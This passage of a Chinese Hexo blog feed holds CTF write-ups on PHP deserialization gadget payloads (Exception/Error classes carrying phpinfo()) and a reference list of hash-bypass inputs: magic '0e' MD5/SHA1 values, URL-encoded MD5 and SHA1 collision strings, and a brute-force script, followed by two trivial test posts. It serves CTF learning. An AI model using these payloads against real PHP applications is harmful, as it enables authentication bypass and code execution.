class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//注意两个Error一定要同行</span></span><br><span class="line"><span class="comment">//str开头要用?&gt;闭合</span></span><br></pre></td></tr></table></figure><h4 id="Exception-PHP5-PHP7-可用"><a href="#Exception-PHP5-PHP7-可用" class="headerlink" title="Exception(PHP5,PHP7 可用)"></a>Exception(PHP5,PHP7 可用)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CDUTSEC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;phpinfo();?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$tr</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CDUTSEC</span>();</span><br><span class="line"><span class="variable">$tr</span>-&gt;var1=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$tr</span>-&gt;var2=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$tr</span>));</span><br></pre></td></tr></table></figure><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>这里推一篇翻到的反序列化文章：<a href="https://5ime.cn/unserialize.html">https://5ime.cn/unserialize.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;构造 pop 链，归根结底就是一条绳子，从你开始的函数穿到危险函数（或者指向 flag），所以你要做的第一件事，就是确认你的</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
    <category term="PHP" scheme="https://blog.hatchet.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>常见的哈希函数绕过个人收藏</title>
    <link href="https://blog.hatchet.top/posts/66a71aff.html"/>
    <id>https://blog.hatchet.top/posts/66a71aff.html</id>
    <published>2024-08-24T22:32:27.000Z</published>
    <updated>2024-08-24T22:32:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>php 对 MD5 加密方法为$a&#x3D;md5(‘string’);比起python就是神仙级，壮哉php。<br>php中存在强比较(&#x3D;&#x3D;&#x2F;!&#x3D;)和弱比较(&#x3D;&#x3D;&#x3D;&#x2F;!&#x3D;&#x3D;)，组两个数组比较可以绕过两个比较(a[]&#x3D;1&amp;b[]&#x3D;2)<br>0e+纯数字只能绕过弱比较，注意只是0e开头是不能绕过比较的。<br>md5($password,’true’)-&gt;ffifdyop 多用于 sql 绕过密码</p><h1 id="MD4"><a href="#MD4" class="headerlink" title="MD4"></a>MD4</h1><h2 id="md4-等于自己-a-md4-a"><a href="#md4-等于自己-a-md4-a" class="headerlink" title="md4 等于自己 -&gt; $a&#x3D;&#x3D;md4($a);"></a>md4 等于自己 -&gt; $a&#x3D;&#x3D;md4($a);</h2><p>0e251288019 0e898201062</p><h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><h2 id="md5-后-0e-数字-md5-a-md5-b"><a href="#md5-后-0e-数字-md5-a-md5-b" class="headerlink" title="md5 后 0e+数字 -&gt; md5($a)&#x3D;&#x3D;md5($b)"></a>md5 后 0e+数字 -&gt; md5($a)&#x3D;&#x3D;md5($b)</h2><p>byGcY sonZ7y QNKCDZO 240610708 s878926199a s155964671a s214587387a</p><h2 id="md5-后-等于自己-a-md5-a"><a href="#md5-后-等于自己-a-md5-a" class="headerlink" title="md5 后 等于自己 -&gt; $a&#x3D;&#x3D;md5($a)"></a>md5 后 等于自己 -&gt; $a&#x3D;&#x3D;md5($a)</h2><p>0e215962017 0e00275209979 0e00506035745 0e00540451811 0e00678205148<br>0e00741250258 0e00928251504 0e01350016114 0e01352028862<br>0e01392313004 0e01875552079 0e01975903983 0e02042356163<br>0e02218562930 0e02451355147 0e02739970294 0e02760920150<br>0e02784726287 0e03298616350 0e03393034171</p><h2 id="双-md5-后等于自己-a-md5-md5-a-（没错真的有这个数）"><a href="#双-md5-后等于自己-a-md5-md5-a-（没错真的有这个数）" class="headerlink" title="双 md5 后等于自己 -&gt; $a&#x3D;&#x3D;md5(md5($a)) （没错真的有这个数）"></a>双 md5 后等于自己 -&gt; $a&#x3D;&#x3D;md5(md5($a)) （没错真的有这个数）</h2><p>0e1138100474</p><h2 id="单-md5-后等于双-md5-后的自己-md5-a-md5-md5-a"><a href="#单-md5-后等于双-md5-后的自己-md5-a-md5-md5-a" class="headerlink" title="单 md5 后等于双 md5 后的自己 -&gt; md5($a)&#x3D;&#x3D;md5(md5($a))"></a>单 md5 后等于双 md5 后的自己 -&gt; md5($a)&#x3D;&#x3D;md5(md5($a))</h2><p>（施工中）</p><h2 id="如果你可以-serialize-反序列化控制数字，而题目限制了字符长度为-5-以下"><a href="#如果你可以-serialize-反序列化控制数字，而题目限制了字符长度为-5-以下" class="headerlink" title="如果你可以 serialize 反序列化控制数字，而题目限制了字符长度为 5 以下"></a>如果你可以 serialize 反序列化控制数字，而题目限制了字符长度为 5 以下</h2><p>那你可以试试 INF 和 NAN 两个数字，因为无法求值，它们的 md5 值就是字符串的 md5 值</p><h2 id="md5-强相等碰撞-md5-a-md5-b-md5-c"><a href="#md5-强相等碰撞-md5-a-md5-b-md5-c" class="headerlink" title="md5 强相等碰撞 -&gt; md5($a)&#x3D;&#x3D;&#x3D;md5($b)&#x3D;&#x3D;&#x3D;md5($c)"></a>md5 强相等碰撞 -&gt; md5($a)&#x3D;&#x3D;&#x3D;md5($b)&#x3D;&#x3D;&#x3D;md5($c)</h2><p><strong>a&#x3D;</strong>%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab<br><strong>&amp;b&#x3D;</strong>%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab<br><strong>&amp;c&#x3D;</strong>%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</p><p>数据大抵是没有问题的，出错可以试着检查下是否支持 url 编码，这里点名 绿色 hackbar，感觉直接传 url 编码的参数总会报错。打 web 做这种题一定要用 burpsuite 传参，鬼知道出什么问题，，有能力的可以 python 写 request</p><h1 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h1><h2 id="sha1-后-0e-数字-sha1-a-sha1-b"><a href="#sha1-后-0e-数字-sha1-a-sha1-b" class="headerlink" title="sha1 后 0e+数字 -&gt; sha1($a)&#x3D;&#x3D;sha1($b)"></a>sha1 后 0e+数字 -&gt; sha1($a)&#x3D;&#x3D;sha1($b)</h2><p>aaroZmOk aaK1STfY aaO8zKZF aa3OFF9m<br>f2WfQ iv2Cn</p><h2 id="sha1-强相等碰撞-sha1-a-sha1-b"><a href="#sha1-强相等碰撞-sha1-a-sha1-b" class="headerlink" title="sha1 强相等碰撞 -&gt; sha1($a)&#x3D;&#x3D;&#x3D;sha1(b)"></a>sha1 强相等碰撞 -&gt; sha1($a)&#x3D;&#x3D;&#x3D;sha1(b)</h2><p>array1&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1<br>&amp;array2&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p><h2 id="sha1-后等于自己"><a href="#sha1-后等于自己" class="headerlink" title="sha1 后等于自己"></a>sha1 后等于自己</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">              text                                            SHA1 Hash</span><br><span class="line">0e00000000000000000000081614617300000000 ==&gt; 0e65307525940999632287492285468259219070</span><br><span class="line">0e00000000000000000000721902017120000000 ==&gt; 0e94981159498252295418182453841140483274</span><br><span class="line">0e01011001101011010001101110101100101000 ==&gt; 0e48906523151976751117677463787111106598</span><br><span class="line">0e11001000001010011000100000010001101000 ==&gt; 0e63407184960930419027062777705081379452</span><br><span class="line">0e01000001100000001010011011001000000100 ==&gt; 0e55962072388397083814346733718698213796</span><br><span class="line">0e10011110000101101000011101011010100100 ==&gt; 0e31188585417285828785355336774237712792</span><br><span class="line">0e01010111000111111010101011010111010100 ==&gt; 0e45906344569616659428808892091261969181</span><br><span class="line">0e00100001110000001111010000010011101100 ==&gt; 0e14860258669052332549568607710438132953</span><br><span class="line">0e11110000111010001001101111111110010010 ==&gt; 0e12174258436385758552874426941686538483</span><br><span class="line">0e10111110011100101100010101111010000110 ==&gt; 0e99774398282593376043462038572281385389</span><br><span class="line">0e11001111110111110010111010000011110110 ==&gt; 0e63185221301034624940345471074357888797</span><br><span class="line">0e00001010010101100100101011101110001110 ==&gt; 0e90943988772171749054413593888105986782</span><br><span class="line">0e01011101110010111011110010010010101110 ==&gt; 0e01608800192659803576771346607441737826</span><br><span class="line">0e10111110101111001000000100011101101110 ==&gt; 0e49094541458479495263034294421025186938</span><br><span class="line">0e11100111101110011010111001010101111110 ==&gt; 0e55770706149948760086200713505841887543</span><br><span class="line">0e11111001010101100110011001010001110001 ==&gt; 0e91120687121163809515824135435029958137</span><br><span class="line">0e01000111101111110010010010000001001001 ==&gt; 0e78071797328546369301825420848872451849</span><br><span class="line">0e00100110100010100110001101110110110101 ==&gt; 0e06077380408260614659219920561082767632</span><br><span class="line">0e11111100001011000011110100100010111101 ==&gt; 0e12149120354415335220758399492713921588</span><br><span class="line">0e00111100110101101001000101011011111101 ==&gt; 0e38661126569790555598431905065403870516</span><br><span class="line">0e10100011100101000001110010100110100011 ==&gt; 0e55745078154640212511596259055910278070</span><br><span class="line">0e10011110011111001001100100000111011011 ==&gt; 0e20319731123101477913295720812414482217</span><br></pre></td></tr></table></figure><h1 id="自己爆破用脚本"><a href="#自己爆破用脚本" class="headerlink" title="自己爆破用脚本"></a>自己爆破用脚本</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_md5</span>(<span class="params">md5_hash</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查MD5哈希值是否以0e开头并且后面跟随纯数字&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> md5_hash.startswith(<span class="string">&quot;0e&quot;</span>) <span class="keyword">and</span> md5_hash[<span class="number">2</span>:].isdigit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_valid_a</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;暴力求解a，使得md5(a)和md5(md5(a))都满足条件&quot;&quot;&quot;</span></span><br><span class="line">    chars = (</span><br><span class="line">        string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">    )  <span class="comment"># 允许的字符集</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):  <span class="comment"># 控制a的长度</span></span><br><span class="line">        <span class="built_in">print</span>(length)</span><br><span class="line">        <span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.product(chars, repeat=length):</span><br><span class="line">            a = <span class="string">&quot;&quot;</span>.join(candidate)</span><br><span class="line">            md5_a = hashlib.md5(a.encode()).hexdigest()</span><br><span class="line">            md5_md5_a = hashlib.md5(md5_a.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> is_valid_md5(md5_a) <span class="keyword">and</span> is_valid_md5(md5_md5_a):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found a: <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;md5(a): <span class="subst">&#123;md5_a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;md5(md5(a)): <span class="subst">&#123;md5_md5_a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行暴力求解</span></span><br><span class="line">find_valid_a()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="说在后面"><a href="#说在后面" class="headerlink" title="说在后面"></a>说在后面</h1><p>我在一开始学习 MD5 绕过时吃了很多亏。还是被勾币出题人拷打少了，导致很多打只能自己硬咽下去。这是博客的一篇文章，在写之时深深感慨自己在茫茫搜索 MD5 时的无力，到自己写时，大大弥补加了很多自己当时搜索时的关键词，希望有点帮助吧。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;php 对 MD5 加密方法为$a&amp;#x3D;md5(‘string’);比起python就是神仙级，壮哉php。&lt;br&gt;p</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="crypto" scheme="https://blog.hatchet.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="https://blog.hatchet.top/posts/d87f7e0c.html"/>
    <id>https://blog.hatchet.top/posts/d87f7e0c.html</id>
    <published>2024-08-24T22:15:58.000Z</published>
    <updated>2024-08-24T22:15:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>不要学我熬夜做东西。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;不要学我熬夜做东西。。。&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Markdown格式测试</title>
    <link href="https://blog.hatchet.top/posts/db60f10c.html"/>
    <id>https://blog.hatchet.top/posts/db60f10c.html</id>
    <published>2024-08-24T22:00:00.000Z</published>
    <updated>2024-08-24T22:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><p>正文这么打</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> this is terminal <span class="built_in">command</span></span><br></pre></td></tr></table></figure><p><a href="https://hexo.io/">这是超链接</a></p><p><a href="https://www.baidu.com/">https://www.baidu.com</a><br><img src="http://www.wazhishi.com/uploads/allimg/240328/0K453B43-0.jpg"><br>不论怎么讲，会战兵力是八十万对六十万，优势在我</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;这是一级标题&quot;&gt;&lt;a href=&quot;#这是一级标题&quot; class=&quot;headerlink&quot; title=&quot;这是一级标题&quot;&gt;&lt;/a&gt;这是一级标题&lt;/h1&gt;&lt;h2 id=&quot;这是二级标题&quot;&gt;&lt;a href=&quot;#这是二级标题&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
  </entry>
  
</feed>
